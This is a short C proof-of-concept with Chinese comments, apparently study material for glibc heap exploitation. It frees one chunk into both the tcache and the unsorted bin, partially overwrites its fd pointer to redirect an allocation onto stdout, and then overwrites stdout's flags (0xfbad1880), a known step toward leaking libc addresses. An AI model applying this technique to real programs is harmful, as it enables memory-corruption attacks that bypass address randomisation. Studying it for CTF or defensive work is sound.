//  手法: 一塊 chunk, 同時在 unsorted bin 和 tcache
//        部份改寫該 chunk 的 fd, 再從 tcache 拿出所要 chunk
//         例如: 所要 chunk 為 stdout

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
	setvbuf(stdout, 0, 2, 0);

	char *chunk = (char *)malloc(0x100);
	malloc(0x10);
	for(int i = 0; i<8; ++i)
		free(chunk);

	*(short *)chunk = (short)stdout;
	malloc(0x100);
	chunk = malloc(0x100);

	*(int64_t *)chunk = 0xfbad1880;
	for(int i = 0; i<0x19; ++i)
		*(char *)(chunk + i + 8) = '\0';

	printf("done\n");
}